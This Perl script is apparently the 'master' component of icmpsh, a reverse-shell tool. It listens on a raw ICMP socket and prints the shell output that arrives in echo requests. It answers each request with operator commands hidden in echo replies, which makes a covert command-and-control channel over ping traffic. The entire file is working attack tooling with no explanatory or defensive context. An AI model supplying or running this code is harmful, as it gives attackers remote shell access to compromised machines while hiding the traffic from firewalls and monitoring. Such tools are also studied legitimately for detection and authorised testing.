#!/usr/bin/env perl



use strict;
use IO::Socket;
use NetPacket::IP;
use NetPacket::ICMP qw(ICMP_ECHOREPLY ICMP_ECHO);
use Net::RawIP;
use Fcntl;

print "icmpsh - master\n";

# create raw socket
my $sock = IO::Socket::INET->new(
                Proto   => "ICMP",
                Type    => SOCK_RAW,
                Blocking => 1) or die "$!";

# set stdin to non-blocking
fcntl(STDIN, F_SETFL, O_NONBLOCK) or die "$!";

print "running...\n";

my $input = '';
while(1) {
        if ($sock->recv(my $buffer, 4096, 0)) {
                my $ip = NetPacket::IP->decode($buffer);
                my $icmp = NetPacket::ICMP->decode($ip->{data});
                if ($icmp->{type} == ICMP_ECHO) {
                        # get identifier and sequencenumber
                        my ($ident,$seq,$data) = unpack("SSa*", $icmp->{data});

                        # write data to stdout and read from stdin
                        print $data;
                        $input = <STDIN>;

                        # compile and send response
                        $icmp->{type} = ICMP_ECHOREPLY;
                        $icmp->{data} = pack("SSa*", $ident, $seq, $input);
                        my $raw = $icmp->encode();
                        my $addr = sockaddr_in(0, inet_aton($ip->{src_ip}));
                        $sock->send($raw, 0, $addr) or die "$!\n";
                }
        }
}
